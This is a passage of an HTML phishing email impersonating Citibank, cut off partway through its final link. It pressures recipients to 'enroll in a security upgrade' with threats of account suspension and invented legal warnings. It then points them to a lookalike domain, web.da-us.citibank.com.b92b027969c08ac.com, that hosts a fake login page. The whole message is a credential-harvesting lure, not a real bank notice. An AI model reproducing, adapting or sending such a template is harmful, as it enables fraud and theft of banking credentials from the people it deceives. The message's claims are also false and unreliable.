      Dear valued Citibank member, <br>
      <br>
      Citibank has changed security screening procedures for online banking, please 
      follow the given instructions in order to comply with our additional security 
      requirements. <br>
      <br>
      We require our members to enroll in our security upgrade, as part of our 
      continuing commitment to protect your account and to reduce the instance 
      of fraud on our website. After you submit the requested information, we 
      will create a unique algorithm based on your personal computer, allowing 
      us to recognize you in any future online banking sessions and thus immediately 
      spotting any unauthorized access. By passing back and forth secret information 
      that only you and Citibank know, you can feel even more secure with your 
      online banking experience. We recognize you and you recognize us. If you 
      could please take 5-10 minutes out of your online experience and enroll 
      in the security upgrade, you will not run into any future problems with 
      the Citibank online banking service. However, failure to meet our security 
      requirements will result in your account suspension. <br>
      <br>
      If you received this notice and you are not the authorized account holder, 
      please be aware that is a violation of the Citibank policy to represent 
      oneself as another Citibank account holder. Such action may also be in violation 
      of local, national, and/or international law. Citibank is committed to assist 
      law enforcement with any inquires related to attempts to misappropriate 
      personal information using the Internet. Information will be provided at 
      the request of law enforcement agencies to ensure that perpetrators are 
      prosecuted to the fullest extend of the law. <br>
      <br>
      Once you have enrolled in our security upgrade your pending Citibank account 
      transactions will not be interrupted and will continue as normal. <br>
      <br>
      <b>Please enroll in our security upgrade by <a href="http://web.da-us.citibank.com.b92b027969c08ac.com/citifi/scripts/login2/index.html?iv=D6C2D9426D706E73&token=28A31257BF196CB2D8305D9876A23B23EBD1FA2BF12C" target="_blank">clicking
